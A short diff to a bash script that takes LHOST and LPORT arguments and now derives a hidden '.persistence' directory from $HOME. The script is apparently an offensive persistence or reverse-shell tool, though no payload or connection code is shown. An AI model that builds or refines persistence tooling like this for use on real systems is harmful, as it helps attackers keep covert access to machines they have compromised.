@@ -5,7 +5,16 @@
 
 LHOST="$1"
 LPORT="$2"
-PERSIST_DIR="~/.persistence"
+
+# --- NEW: determine persistence dir based on $HOME ---
+USER_NAME="$(whoami)"
+
+if [[ -n "$HOME" && -d "$HOME" ]]; then
+  PERSIST_DIR="$HOME/.persistence"
+else
+  PERSIST_DIR="/home/${USER_NAME}/.persistence"
+fi
+# ----------------------------------------------------
 
 if [[ -z "$LHOST" || -z "$LPORT" ]]; then
   echo -e "\e[91m[!] Usage: $0 <LHOST> <LPORT>\e[0m"
